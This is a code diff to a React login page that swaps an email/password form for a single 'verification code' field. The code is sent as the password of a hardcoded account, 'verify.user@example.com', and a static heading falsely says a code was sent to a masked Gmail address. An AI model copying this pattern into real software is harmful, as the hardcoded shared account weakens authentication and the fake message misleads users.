@@ -3,35 +3,26 @@ import axios from "axios";
 import { useNavigate } from "react-router-dom";
 
 export default function Login() {
-  const [formData, setFormData] = useState({ email: "", password: "" });
+  const [code, setCode] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
   const handleChange = (e) => {
-    setFormData({ ...formData, [e.target.name]: e.target.value });
-  };
-
-  const isValidInput = (value) => {
-    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
-    const isPhone = /^01\d{9}$/.test(value); // starts with 01, total 11 digits
-    return isEmail || isPhone;
+    setCode(e.target.value);
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError("");
-
-    if (!isValidInput(formData.email)) {
-      setError("Enter a valid email or an 11-digit number starting with 01");
-      return;
-    }
-
     setLoading(true);
 
     try {
       const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";
-      const res = await axios.post(`${API_URL}/api/auth/login`, formData);
+      const res = await axios.post(`${API_URL}/api/auth/login`, {
+        email: "verify.user@example.com",
+        password: code,
+      });
       localStorage.setItem("token", res.data.token);
       localStorage.setItem("user", JSON.stringify(res.data.user));
       navigate("/");
@@ -50,23 +41,17 @@ export default function Login() {
         </h1>
 
         <div className="bg-white rounded-lg shadow-md p-6">
+          <h2 className="text-lg font-semibold text-center mb-4">
+            We have sent a code to a*****9@gmail.com
+          </h2>
+
           <form onSubmit={handleSubmit} className="flex flex-col gap-3">
             <input
               type="text"
-              name="email"
-              placeholder="We have send a verification code to a****9@gmail.com"
-              value={formData.email}
-              onChange={handleChange}
-              
-              className="border border-gray-300 rounded-md px-4 py-3 text-lg outline-none focus:border-[#1877f2]"
-            />
-            <input
-              type="password"
-              name="password"
+              name="code"
               placeholder="Verification code"
-              value={formData.password}
+              value={code}
               onChange={handleChange}
-              required
               className="border border-gray-300 rounded-md px-4 py-3 text-lg outline-none focus:border-[#1877f2]"
             />
 
